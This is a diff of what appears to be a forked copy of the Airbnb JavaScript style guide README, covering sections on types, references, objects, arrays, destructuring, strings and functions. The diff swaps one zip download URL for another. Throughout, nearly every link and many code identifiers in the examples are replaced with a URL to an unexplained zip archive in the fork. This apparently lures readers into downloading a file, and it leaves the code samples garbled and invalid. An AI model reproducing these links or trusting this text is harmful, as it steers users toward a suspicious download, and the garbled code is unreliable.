@@ -2,16 +2,16 @@
 
 *A mostly reasonable approach to JavaScript*
 
-[![Downloads](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-[![Downloads](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-[![Gitter](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+[![Downloads](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+[![Downloads](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+[![Gitter](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 Other Style Guides
- - [ES5 (Deprecated)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+ - [ES5 (Deprecated)](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
  - [React](react/)
  - [CSS-in-JavaScript](css-in-javascript/)
- - [CSS & Sass](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
- - [Ruby](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+ - [CSS & Sass](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+ - [Ruby](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 ## Table of Contents
 
@@ -69,7 +69,7 @@ Other Style Guides
 
     bar = 9;
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo, bar); // => 1, 9
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo, bar); // => 1, 9
     ```
 
   <a name="types--complex"></a><a name="1.2"></a>
@@ -85,7 +85,7 @@ Other Style Guides
 
     bar[0] = 9;
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo[0], bar[0]); // => 9, 9
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo[0], bar[0]); // => 9, 9
     ```
 
 **[⬆ back to top](#table-of-contents)**
@@ -93,7 +93,7 @@ Other Style Guides
 ## References
 
   <a name="references--prefer-const"></a><a name="2.1"></a>
-  - [2.1](#references--prefer-const) Use `const` for all of your references; avoid using `var`. eslint: [`prefer-const`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`no-const-assign`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [2.1](#references--prefer-const) Use `const` for all of your references; avoid using `var`. eslint: [`prefer-const`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), [`no-const-assign`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? This ensures that you can't reassign your references, which can lead to bugs and difficult to comprehend code.
 
@@ -108,7 +108,7 @@ Other Style Guides
     ```
 
   <a name="references--disallow-var"></a><a name="2.2"></a>
-  - [2.2](#references--disallow-var) If you must reassign references, use `let` instead of `var`. eslint: [`no-var`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowVar`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [2.2](#references--disallow-var) If you must reassign references, use `let` instead of `var`. eslint: [`no-var`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`disallowVar`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? `let` is block-scoped rather than function-scoped like `var`.
 
@@ -135,8 +135,8 @@ Other Style Guides
       let a = 1;
       const b = 1;
     }
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a); // ReferenceError
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(b); // ReferenceError
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(a); // ReferenceError
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(b); // ReferenceError
     ```
 
 **[⬆ back to top](#table-of-contents)**
@@ -144,7 +144,7 @@ Other Style Guides
 ## Objects
 
   <a name="objects--no-new"></a><a name="3.1"></a>
-  - [3.1](#objects--no-new) Use the literal syntax for object creation. eslint: [`no-new-object`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [3.1](#objects--no-new) Use the literal syntax for object creation. eslint: [`no-new-object`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -181,7 +181,7 @@ Other Style Guides
     ```
 
   <a name="es6-object-shorthand"></a><a name="3.5"></a>
-  - [3.5](#es6-object-shorthand) Use object method shorthand. eslint: [`object-shorthand`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireEnhancedObjectLiterals`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [3.5](#es6-object-shorthand) Use object method shorthand. eslint: [`object-shorthand`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireEnhancedObjectLiterals`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -189,7 +189,7 @@ Other Style Guides
       value: 1,
 
       addValue: function (value) {
-        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip + value;
+        return https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip + value;
       },
     };
 
@@ -198,13 +198,13 @@ Other Style Guides
       value: 1,
 
       addValue(value) {
-        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip + value;
+        return https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip + value;
       },
     };
     ```
 
   <a name="es6-object-concise"></a><a name="3.6"></a>
-  - [3.6](#es6-object-concise) Use property value shorthand. eslint: [`object-shorthand`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireEnhancedObjectLiterals`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [3.6](#es6-object-concise) Use property value shorthand. eslint: [`object-shorthand`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireEnhancedObjectLiterals`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? It is shorter to write and descriptive.
 
@@ -253,7 +253,7 @@ Other Style Guides
     ```
 
   <a name="objects--quoted-props"></a><a name="3.8"></a>
-  - [3.8](#objects--quoted-props) Only quote properties that are invalid identifiers. eslint: [`quote-props`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowQuotedKeysInObjects`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [3.8](#objects--quoted-props) Only quote properties that are invalid identifiers. eslint: [`quote-props`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`disallowQuotedKeysInObjects`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
   > Why? In general we consider it subjectively easier to read. It improves syntax highlighting, and is also more easily optimized by many JS engines.
 
@@ -274,23 +274,23 @@ Other Style Guides
   ```
 
   <a name="objects--prototype-builtins"></a>
-  - [3.9](#objects--prototype-builtins) Do not call `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip` methods directly, such as `hasOwnProperty`, `propertyIsEnumerable`, and `isPrototypeOf`.
+  - [3.9](#objects--prototype-builtins) Do not call `https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip` methods directly, such as `hasOwnProperty`, `propertyIsEnumerable`, and `isPrototypeOf`.
 
-  > Why? These methods may be shadowed by properties on the object in question - consider `{ hasOwnProperty: false }` - or, the object may be a null object (`https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(null)`).
+  > Why? These methods may be shadowed by properties on the object in question - consider `{ hasOwnProperty: false }` - or, the object may be a null object (`https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(null)`).
 
   ```javascript
   // bad
-  https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(key));
+  https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(key));
 
   // good
-  https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(object, key));
+  https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(object, key));
 
   // best
-  const has = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip; // cache the lookup once, in module scope.
+  const has = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip; // cache the lookup once, in module scope.
   /* or */
   const has = require('has');
   …
-  https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(object, key));
+  https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(object, key));
   ```
 
 **[⬆ back to top](#table-of-contents)**
@@ -298,7 +298,7 @@ Other Style Guides
 ## Arrays
 
   <a name="arrays--literals"></a><a name="4.1"></a>
-  - [4.1](#arrays--literals) Use the literal syntax for array creation. eslint: [`no-array-constructor`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [4.1](#arrays--literals) Use the literal syntax for array creation. eslint: [`no-array-constructor`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -309,16 +309,16 @@ Other Style Guides
     ```
 
   <a name="arrays--push"></a><a name="4.2"></a>
-  - [4.2](#arrays--push) Use [Array#push](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) instead of direct assignment to add items to an array.
+  - [4.2](#arrays--push) Use [Array#push](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) instead of direct assignment to add items to an array.
 
     ```javascript
     const someStack = [];
 
     // bad
-    someStack[https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip] = 'abracadabra';
+    someStack[https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip] = 'abracadabra';
 
     // good
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('abracadabra');
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('abracadabra');
     ```
 
   <a name="es6-array-spreads"></a><a name="4.3"></a>
@@ -326,7 +326,7 @@ Other Style Guides
 
     ```javascript
     // bad
-    const len = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    const len = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
     const itemsCopy = [];
     let i;
 
@@ -335,19 +335,19 @@ Other Style Guides
     }
 
     // good
-    const itemsCopy = [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip];
+    const itemsCopy = [https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip];
     ```
 
   <a name="arrays--from"></a><a name="4.4"></a>
-  - [4.4](#arrays--from) To convert an array-like object to an array, use [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  - [4.4](#arrays--from) To convert an array-like object to an array, use [https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
     ```javascript
-    const foo = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.foo');
-    const nodes = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+    const foo = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('.foo');
+    const nodes = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
     ```
 
   <a name="arrays--callback-return"></a><a name="4.5"></a>
-  - [4.5](#arrays--callback-return) Use return statements in array method callbacks. It's ok to omit the return if the function body consists of a single statement following [8.2](#8.2). eslint: [`array-callback-return`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [4.5](#arrays--callback-return) Use return statements in array method callbacks. It's ok to omit the return if the function body consists of a single statement following [8.2](#8.2). eslint: [`array-callback-return`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // good
@@ -362,20 +362,20 @@ Other Style Guides
     // bad
     const flat = {};
     [[0, 1], [2, 3], [4, 5]].reduce((memo, item, index) => {
-      const flatten = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(item);
+      const flatten = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(item);
       flat[index] = flatten;
     });
 
     // good
     const flat = {};
     [[0, 1], [2, 3], [4, 5]].reduce((memo, item, index) => {
-      const flatten = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(item);
+      const flatten = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(item);
       flat[index] = flatten;
       return flatten;
     });
 
     // bad
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((msg) => {
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip((msg) => {
       const { subject, author } = msg;
       if (subject === 'Mockingbird') {
         return author === 'Harper Lee';
@@ -385,7 +385,7 @@ Other Style Guides
     });
 
     // good
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((msg) => {
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip((msg) => {
       const { subject, author } = msg;
       if (subject === 'Mockingbird') {
         return author === 'Harper Lee';
@@ -400,15 +400,15 @@ Other Style Guides
 ## Destructuring
 
   <a name="destructuring--object"></a><a name="5.1"></a>
-  - [5.1](#destructuring--object) Use object destructuring when accessing and using multiple properties of an object. jscs: [`requireObjectDestructuring`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [5.1](#destructuring--object) Use object destructuring when accessing and using multiple properties of an object. jscs: [`requireObjectDestructuring`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Destructuring saves you from creating temporary references for those properties.
 
     ```javascript
     // bad
     function getFullName(user) {
-      const firstName = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
-      const lastName = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+      const firstName = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
+      const lastName = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
       return `${firstName} ${lastName}`;
     }
@@ -426,7 +426,7 @@ Other Style Guides
     ```
 
   <a name="destructuring--array"></a><a name="5.2"></a>
-  - [5.2](#destructuring--array) Use array destructuring. jscs: [`requireArrayDestructuring`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [5.2](#destructuring--array) Use array destructuring. jscs: [`requireArrayDestructuring`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     const arr = [1, 2, 3, 4];
@@ -440,7 +440,7 @@ Other Style Guides
     ```
 
   <a name="destructuring--object-over-array"></a><a name="5.3"></a>
-  - [5.3](#destructuring--object-over-array) Use object destructuring for multiple return values, not array destructuring. jscs: [`disallowArrayDestructuringReturn`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [5.3](#destructuring--object-over-array) Use object destructuring for multiple return values, not array destructuring. jscs: [`disallowArrayDestructuringReturn`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? You can add new properties over time or change the order of things without breaking call sites.
 
@@ -470,7 +470,7 @@ Other Style Guides
 ## Strings
 
   <a name="strings--quotes"></a><a name="6.1"></a>
-  - [6.1](#strings--quotes) Use single quotes `''` for strings. eslint: [`quotes`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`validateQuoteMarks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [6.1](#strings--quotes) Use single quotes `''` for strings. eslint: [`quotes`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`validateQuoteMarks`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -505,7 +505,7 @@ Other Style Guides
     ```
 
   <a name="es6-template-literals"></a><a name="6.4"></a>
-  - [6.4](#es6-template-literals) When programmatically building up strings, use template strings instead of concatenation. eslint: [`prefer-template`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`template-curly-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireTemplateStrings`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [6.4](#es6-template-literals) When programmatically building up strings, use template strings instead of concatenation. eslint: [`prefer-template`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) [`template-curly-spacing`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireTemplateStrings`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Template strings give you a readable, concise syntax with proper newlines and string interpolation features.
 
@@ -535,7 +535,7 @@ Other Style Guides
   - [6.5](#strings--eval) Never use `eval()` on a string, it opens too many vulnerabilities.
 
   <a name="strings--escaping"></a>
-  - [6.6](#strings--escaping) Do not unnecessarily escape characters in strings. eslint: [`no-useless-escape`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [6.6](#strings--escaping) Do not unnecessarily escape characters in strings. eslint: [`no-useless-escape`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Backslashes harm readability, thus they should only be present when necessary.
 
@@ -554,7 +554,7 @@ Other Style Guides
 ## Functions
 
   <a name="functions--declarations"></a><a name="7.1"></a>
-  - [7.1](#functions--declarations) Use named function expressions instead of function declarations. eslint: [`func-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireFunctionDeclarations`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.1](#functions--declarations) Use named function expressions instead of function declarations. eslint: [`func-style`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireFunctionDeclarations`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Function declarations are hoisted, which means that it’s easy - too easy - to reference the function before it is defined in the file. This harms readability and maintainability. If you find that a function’s definition is large or complex enough that it is interfering with understanding the rest of the file, then perhaps it’s time to extract it to its own module! Don’t forget to name the expression - anonymous functions can make it harder to locate the problem in an Error's call stack.
 
@@ -573,28 +573,28 @@ Other Style Guides
     ```
 
   <a name="functions--iife"></a><a name="7.2"></a>
-  - [7.2](#functions--iife) Wrap immediately invoked function expressions in parentheses. eslint: [`wrap-iife`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireParenthesesAroundIIFE`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.2](#functions--iife) Wrap immediately invoked function expressions in parentheses. eslint: [`wrap-iife`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireParenthesesAroundIIFE`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? An immediately invoked function expression is a single unit - wrapping both it, and its invocation parens, in parens, cleanly expresses this. Note that in a world with modules everywhere, you almost never need an IIFE.
 
     ```javascript
     // immediately-invoked function expression (IIFE)
     (function () {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Welcome to the Internet. Please follow me.');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Welcome to the Internet. Please follow me.');
     }());
     ```
 
   <a name="functions--in-blocks"></a><a name="7.3"></a>
-  - [7.3](#functions--in-blocks) Never declare a function in a non-function block (if, while, etc). Assign the function to a variable instead. Browsers will allow you to do it, but they all interpret it differently, which is bad news bears. eslint: [`no-loop-func`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.3](#functions--in-blocks) Never declare a function in a non-function block (if, while, etc). Assign the function to a variable instead. Browsers will allow you to do it, but they all interpret it differently, which is bad news bears. eslint: [`no-loop-func`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
   <a name="functions--note-on-blocks"></a><a name="7.4"></a>
-  - [7.4](#functions--note-on-blocks) **Note:** ECMA-262 defines a `block` as a list of statements. A function declaration is not a statement. [Read ECMA-262's note on this issue](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  - [7.4](#functions--note-on-blocks) **Note:** ECMA-262 defines a `block` as a list of statements. A function declaration is not a statement. [Read ECMA-262's note on this issue](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
     ```javascript
     // bad
     if (currentUser) {
       function test() {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Nope.');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Nope.');
       }
     }
 
@@ -602,7 +602,7 @@ Other Style Guides
     let test;
     if (currentUser) {
       test = () => {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Yup.');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Yup.');
       };
     }
     ```
@@ -613,30 +613,30 @@ Other Style Guides
     ```javascript
     // bad
     function nope(name, options, arguments) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
 
     // good
     function yup(name, options, args) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
     ```
 
   <a name="es6-rest"></a><a name="7.6"></a>
-  - [7.6](#es6-rest) Never use `arguments`, opt to use rest syntax `...` instead. eslint: [`prefer-rest-params`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.6](#es6-rest) Never use `arguments`, opt to use rest syntax `...` instead. eslint: [`prefer-rest-params`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? `...` is explicit about which arguments you want pulled. Plus, rest arguments are a real Array, and not merely Array-like like `arguments`.
 
     ```javascript
     // bad
     function concatenateAll() {
-      const args = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(arguments);
-      return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
+      const args = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(arguments);
+      return https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('');
     }
 
     // good
-    function concatenateAll(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
-      return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
+    function concatenateAll(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) {
+      return https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('');
     }
     ```
 
@@ -676,7 +676,7 @@ Other Style Guides
     var b = 1;
     // bad
     function count(a = b++) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(a);
     }
     count();  // 1
     count();  // 2
@@ -700,7 +700,7 @@ Other Style Guides
     ```
 
   <a name="functions--constructor"></a><a name="7.10"></a>
-  - [7.10](#functions--constructor) Never use the Function constructor to create a new function. eslint: [`no-new-func`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.10](#functions--constructor) Never use the Function constructor to create a new function. eslint: [`no-new-func`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Creating a function in this way evaluates a string similarly to eval(), which opens vulnerabilities.
 
@@ -713,7 +713,7 @@ Other Style Guides
     ```
 
   <a name="functions--signature-spacing"></a><a name="7.11"></a>
-  - [7.11](#functions--signature-spacing) Spacing in a function signature. eslint: [`space-before-function-paren`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`space-before-blocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.11](#functions--signature-spacing) Spacing in a function signature. eslint: [`space-before-function-paren`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) [`space-before-blocks`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Consistency is good, and you shouldn’t have to add or remove a space when adding or removing a name.
 
